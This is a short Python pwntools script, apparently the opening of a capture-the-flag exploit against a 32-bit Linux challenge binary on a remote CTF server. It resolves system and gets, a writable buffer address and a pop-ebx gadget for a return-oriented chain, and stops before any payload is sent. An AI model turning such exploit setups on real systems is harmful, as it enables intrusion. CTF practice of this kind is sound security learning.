from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28116)
elf = ELF('./pwn')
system = elf.sym['system']
buf2 = 0x804B060
gets = elf.sym['gets']
pop_ebx = 0x8048409     # 0x08048409 : pop ebx ; ret
